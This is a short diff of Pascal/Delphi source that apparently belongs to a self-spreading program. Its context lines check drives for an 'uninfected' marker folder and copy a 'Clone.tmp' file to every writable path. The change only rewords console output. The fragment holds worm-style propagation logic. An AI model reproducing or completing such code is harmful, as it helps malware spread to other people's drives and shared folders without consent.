@@ -103,7 +103,7 @@ Begin
           Lbl:=GetVolumeLabel(I);
           D:=I+':\'+Lbl;
           if Not(DirectoryExists(D)) then Begin
-            Writeln('Uninfected [',I,'] found.');
+            Writeln('Uninfected [',I,'] drive found.');
             try
               MkDir(D);
             except
@@ -192,8 +192,8 @@ Begin
   if AlreadyTried.IndexOf(AList.Strings[J])=-1 then Begin
     if WriteAccess(AList.Strings[J]) then Begin
       CopyFile('Clone.tmp', PChar(GetCloneName(AList.Strings[J])), True);
-      Write('YES: ');
-    end else Write('NO: ');
+      Write('  Writable path found: ');
+    end;
     Writeln(AList.Strings[J]);
     AlreadyTried.Add(AList.Strings[J]);
   end;
